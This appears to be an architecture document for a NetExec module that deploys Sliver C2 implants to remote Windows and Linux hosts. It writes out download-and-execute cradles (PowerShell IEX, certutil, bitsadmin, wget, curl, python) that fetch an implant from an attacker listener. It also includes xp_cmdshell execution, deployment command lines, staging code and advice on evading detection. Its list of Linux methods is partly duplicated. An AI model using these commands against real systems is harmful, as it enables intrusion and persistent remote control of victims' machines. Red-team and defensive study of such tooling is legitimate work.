# Architecture

## Overview

The `sliver_exec` NetExec module provides flexible deployment options for Sliver C2 implants across remote Windows and Linux targets. It supports multiple protocols (SMB, WinRM, SSH, MSSQL) and offers three distinct deployment modes optimized for different scenarios.

## Deployment Modes

### 1. Direct Implant Upload (Classic)

The simplest and most reliable approach - uploads the full implant binary directly to the target and executes it.

**Flow Diagram:**

```
┌─────────────────┐                            ┌──────────────────┐
│   NetExec       │    1. Generate implant    │  Sliver Server   │
│   (attacker)    │◄─────────────────────────►│  (C2)            │
└────────┬────────┘         (~17MB EXE)        └──────────────────┘
         │                                              ▲
         │ 2. Upload implant                            │
         │    via SMB/WinRM/SSH                         │ 4. mTLS C2
         │    (~17MB transfer)                          │    callback
         ▼                                              │
┌─────────────────┐    3. Execute               ┌──────┴──────────┐
│   Target Host   │─────implant────────────────►│  Beacon spawned │
│   (victim)      │                              └─────────────────┘
└─────────────────┘
```

**Characteristics:**
- Single operation (upload + execute)
- Works with all protocols (SMB, WinRM, SSH, MSSQL)
- Reliable, no dependencies on target capabilities
- ~17MB payload transfer per target
- Files written to disk (can be cleaned up with CLEANUP=True)

**Use Cases:**
- Fast deployment across multiple targets
- Targets with limited internet connectivity
- When disk writes are acceptable

---

### 2. HTTP Download Staging (New - Lightweight)

A two-stage approach that executes a tiny download cradle on the target, which then fetches the full implant from a Sliver-hosted HTTP server.

**Flow Diagram:**

```
┌─────────────────┐    1. Gen implant    ┌──────────────────┐
│   NetExec       │◄───────────────────► │  Sliver Server   │
│   (attacker)    │       (~17MB)         │  (C2 server)     │
└────────┬────────┘                       └──────────────────┘
         │                                         │
         │ 2a. Start HTTP                          │
         │     listener + host                     │
         │     implant on website                  │
         │◄────────────────────────────────────────┘
         │
         │ 2b. Execute tiny
         │     PowerShell cmd
         │     (~200 bytes)
         ▼
┌─────────────────┐    3. Download       ┌──────────────────┐
│   Target Host   │───────implant───────►│  Sliver HTTP     │
│   (WinRM/SMB)   │      (17 MB)         │  (website:8080)  │
└────────┬────────┘                      └──────────────────┘
         │ 4. Execute
         │    implant
         ▼                               ┌──────────────────┐
┌─────────────────┐    5. mTLS C2        │  Sliver Server   │
│  Beacon spawned │────callback─────────►│  (mTLS listener) │
└─────────────────┘                      └──────────────────┘
         ▲
         │ 6. Cleanup: Remove
         │    website + stop
         └────HTTP listener
```

**Download Methods:**

**Windows:**

1. **PowerShell (Default)** - Modern, most reliable:
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString('http://<LISTENER_IP>:<PORT>/i.exe')
   ```

2. **Certutil (LOLBin)** - Classic Windows built-in:
   ```cmd
   certutil -urlcache -split -f http://<LISTENER_IP>:<PORT>/i.exe %TEMP%\i.exe && %TEMP%\i.exe
   ```

3. **BITSAdmin (Alternative)** - Background Intelligent Transfer Service:
   ```cmd
   bitsadmin /transfer job http://<LISTENER_IP>:<PORT>/i.exe %TEMP%\i.exe && %TEMP%\i.exe
   ```

**Linux:**

4. **wget (Recommended)** - Most common Linux download tool:
   ```bash
   wget -q -O /tmp/implant http://<LISTENER_IP>:<PORT>/i && chmod +x /tmp/implant && nohup /tmp/implant &
   ```

5. **curl (Alternative)** - Available on most modern Linux systems:
   ```bash
   curl -s -o /tmp/implant http://<LISTENER_IP>:<PORT>/i && chmod +x /tmp/implant && nohup /tmp/implant &
   ```

6. **python3 (Fallback)** - When wget/curl unavailable:
   ```bash
   python3 -c "import urllib.request; urllib.request.urlretrieve('http://<LISTENER_IP>:<PORT>/i', '/tmp/implant')" && chmod +x /tmp/implant && nohup /tmp/implant &
   ```

5. **curl (Alternative)** - Available on most modern Linux systems:
   ```bash
   curl -s -o /tmp/implant http://172.17.0.2:8080/i && chmod +x /tmp/implant && nohup /tmp/implant &
   ```

6. **python (Fallback)** - When wget/curl unavailable:
   ```bash
   python3 -c "import urllib.request; urllib.request.urlretrieve('http://172.17.0.2:8080/i', '/tmp/implant')" && chmod +x /tmp/implant && nohup /tmp/implant &
   ```

**Characteristics:**
- Minimal initial payload (~200-250 bytes vs ~17MB)
- Target downloads implant from Sliver HTTP server
- Automatic cleanup (website removed, listener stopped after beacon callback)
- Requires target HTTP/HTTPS connectivity to Sliver server
- WinRM, SMB, SSH protocols supported
- Cross-platform: Windows (powershell/certutil/bitsadmin) and Linux (wget/curl/python)

**Use Cases:**
- Minimizing network traffic to target
- When small initial footprint is desired
- Testing target's outbound HTTP/HTTPS capabilities
- Bypassing upload restrictions

**Configuration:**
```bash
# Windows
nxc winrm 192.168.1.10 -u user -p pass -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=True STAGER_PORT=8080 STAGING_METHOD=powershell

# Linux
nxc ssh 192.168.1.50 -u root -p pass -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=True STAGER_PORT=8080 STAGING_METHOD=wget
```

---

### 3. TCP/HTTP Shellcode Injection (Legacy)

In-memory shellcode injection using Sliver's stager mechanism. Two-stage process: bootstrap shellcode + full implant fetch.

**Flow Diagram:**

```
┌─────────────────┐    1. Gen stager     ┌──────────────────┐
│   NetExec       │       shellcode      │  Sliver Server   │
│   (attacker)    │◄────────────────────►│  (C2)            │
└────────┬────────┘      (~17MB!)        └──────────────────┘
         │                                         │
         │ 2a. Start TCP/HTTP                      │
         │     stager listener                     │
         │◄────────────────────────────────────────┘
         │
         │ 2b. Inject shellcode
         │     into memory
         │     (WinRM only)
         ▼
┌─────────────────┐    3. Fetch stage2   ┌──────────────────┐
│   Target Host   │◄─────────────────────┤  Stager Listener │
│   (memory)      │      (full impl)     │  (TCP/HTTP)      │
└────────┬────────┘                      └──────────────────┘
         │ 4. Execute
         │    stage2
         ▼                               ┌──────────────────┐
┌─────────────────┐    5. mTLS C2        │  Sliver Server   │
│  Beacon spawned │────callback─────────►│  (mTLS listener) │
└─────────────────┘                      └──────────────────┘
```

**Characteristics:**
- In-memory execution (no disk writes)
- Two-stage: bootstrap shellcode + full implant
- Ironically, "stager" shellcode is ~17MB (not actually lightweight)
- WinRM protocol only
- Complex staging mechanism

**Use Cases:**
- When in-memory execution is required
- WinRM-based deployments
- Legacy compatibility

**Configuration:**
```bash
nxc winrm 192.168.1.10 -u user -p pass -M sliver_exec \
  -o RHOST=10.0.0.5 RPORT=8888 \
     STAGING=True STAGER_RHOST=10.0.0.5 STAGER_RPORT=8080 STAGER_PROTOCOL=tcp
```

---

## Technical Details

### Sliver API Interactions

The module uses the Sliver gRPC API via the `sliver-py` client library:

**Implant Generation:**
```python
# Direct generation
config = client.generate(name, os, arch, format, ...)
implant_bytes = config.File

# Or via profile
profiles = await client.implant_profiles()
profile = profiles.Profiles[profile_name]
config = client.generate_from_profile(profile)
```

**HTTP Staging (New):**
```python
# 1. Generate full implant
generate_req = clientpb.GenerateReq(...)
generate_resp = await client._stub.Generate(generate_req)

# 2. Host on Sliver website
content = clientpb.WebContent(Path="/i.exe", Content=implant_bytes, ...)
add_req = clientpb.WebsiteAddContent(Name="staging", Contents={...})
await client._stub.WebsiteAddContent(add_req)

# 3. Start HTTP listener linked to website
listener_req = clientpb.HTTPListenerReq(Host=host, Port=port, Website="staging")
await client._stub.StartHTTPListener(listener_req)

# 4. Execute download cradle on target
connection.execute(f"powershell IEX(New-Object ...)")

# 5. Wait for beacon, then cleanup
await client._stub.WebsiteRemove(Website(Name="staging"))
await client._stub.KillJob(KillJobReq(ID=job_id))
```

**TCP/HTTP Shellcode Staging (Legacy):**
```python
# 1. Generate stager shellcode
stage_req = clientpb.GenerateStageReq(...)
stage_resp = await client._stub.GenerateStage(stage_req)

# 2. Start stager listener
stager_req = clientpb.StagerListenerReq(Host=host, Port=port, ...)
await client._stub.StartTCPStagerListener(stager_req)

# 3. Execute shellcode via WinRM
connection.execute_fileless(stage_resp.Data)
```

### Protocol Handlers

**SMB Protocol:**
```python
# Upload implant
context.smb_share = "C$"
connection.conn.putFile(share, path, data)

# Execute via scheduled task
connection.conn.exec_method(command, share)
```

**WinRM Protocol:**
```python
# Upload implant
connection.conn.put_file(local_path, remote_path)

# Execute command
connection.conn.execute(command)

# Fileless execution (shellcode staging only)
connection.conn.execute_fileless(shellcode)
```

**SSH Protocol:**
```python
# Upload via SFTP
sftp = connection.conn.open_sftp()
sftp.put(local_path, remote_path)

# Execute command
stdin, stdout, stderr = connection.conn.exec_command(command)
```

**MSSQL Protocol:**
```python
# Upload via xp_cmdshell + filesystem operations
connection.sql_query(f"EXEC xp_cmdshell 'echo ... > {path}'")

# Execute command
connection.sql_query(f"EXEC xp_cmdshell '{command}'")
```

### Worker Thread Architecture

The module uses a separate worker thread to handle blocking gRPC calls without blocking NetExec's main thread:

```python
class GrpcWorker:
    async def _do_connect(self, config_path):
        """Establish Sliver client connection."""
        return await SliverClientConfig.from_file(config_path)
    
    async def _do_generate_implant(self, name, os, arch, ...):
        """Generate implant binary."""
        ...
    
    async def _do_website_add_content(self, website_name, path, content):
        """Host implant on Sliver website."""
        ...
    
    async def _do_start_http_listener_with_website(self, host, port, website):
        """Start HTTP listener serving website."""
        ...

# Main thread submits work to worker
result = await worker.submit(_do_generate_implant, args)
```

**Async Event Loop:**
- Main NetExec thread remains responsive
- Worker handles slow Sliver API calls asynchronously
- Results returned via queue

### OS/Architecture Detection

Automatic detection from target connection metadata:

```python
def _detect_os_and_arch(self, connection):
    os_hint = connection.os.lower()
    arch_hint = connection.arch if hasattr(connection, 'arch') else None
    
    # Map connection metadata to Sliver types
    if 'windows' in os_hint:
        return 'windows', arch_hint or 'amd64'
    elif 'linux' in os_hint or 'unix' in os_hint:
        return 'linux', arch_hint or 'amd64'
    else:
        return 'windows', 'amd64'  # Conservative default
```

### Beacon Waiting & Cleanup

```python
def _wait_for_beacon_and_cleanup(self, implant_name, wait_seconds, cleanup_artifacts):
    start_time = time.time()
    
    while time.time() - start_time < wait_seconds:
        beacons = sliver_client.beacons()
        for beacon in beacons:
            if beacon.Name == implant_name:
                # Beacon found! Cleanup if requested
                if cleanup_artifacts:
                    if self.stager_port:  # HTTP staging mode
                        await worker._do_website_remove(website_name)
                        await worker._do_kill_job(http_job_id)
                    else:  # Direct upload mode
                        connection.remove_file(implant_path)
                return True
        
        time.sleep(5)  # Poll every 5 seconds
    
    return False  # Timeout
```

---

## Lazy Loading of Protobuf Dependencies

The module uses lazy loading to ensure compatibility with NetExec's module discovery system:

```python
clientpb = None  # Global, imported lazily
sliverpb = None
commonpb = None

def _import_protobuf():
    """Lazy import protobuf bindings only when actually needed."""
    global clientpb, sliverpb, commonpb
    if clientpb is not None:
        return
    
    from sliver.pb import client_pb2 as clientpb_module
    from sliver.pb import sliver_pb2 as sliverpb_module
    from sliver.pb import common_pb2 as commonpb_module
    
    clientpb = clientpb_module
    sliverpb = sliverpb_module
    commonpb = commonpb_module
```

**Why This Matters:**
- NetExec lists modules by importing them (`nxc smb -L`)
- NetExec's environment doesn't include Sliver protobuf bindings
- Lazy loading allows module metadata extraction without protobuf imports
- Actual protobuf usage only occurs when module executes

---

## Security Considerations

### Credential Handling
- Sliver configs contain CA cert, client cert, and private key
- Stored in `~/.sliver-client/configs/`
- Protected by filesystem permissions
- Never logged or exposed

### Network Traffic
- **Direct Upload:** Large (~17MB) payload transfer to target
- **HTTP Staging:** Small (~200 bytes) initial command + target-initiated download
- **Shellcode Staging:** Large (~17MB) shellcode transfer + stager listener traffic

### Operational Security
- **Cleanup Option:** Remove implants/artifacts after beacon callback
- **Unique Names:** Each implant gets unique name (reduces detection correlation)
- **Beacon Intervals:** Configurable jitter to avoid pattern detection
- **Profile Support:** Use pre-configured profiles for consistent C2 config

---

## Performance Characteristics

| Deployment Mode | Initial Transfer | Network Connections | Disk Writes | Time to Beacon |
|-----------------|------------------|---------------------|-------------|----------------|
| Direct Upload | ~17MB to target | Target → C2 | 1 file (~17MB) | Fast (~5-10s) |
| HTTP Staging | ~200 bytes to target | Target → HTTP → C2 | 1 file (~17MB) | Medium (~15-30s) |
| Shellcode Staging | ~17MB to target | Target ← Stager → C2 | 0 (in-memory) | Slow (~30-60s) |

**Recommendations:**
- **Fast deployment, many targets:** Direct Upload
- **Minimal initial footprint:** HTTP Staging
- **In-memory execution required:** Shellcode Staging (WinRM only)
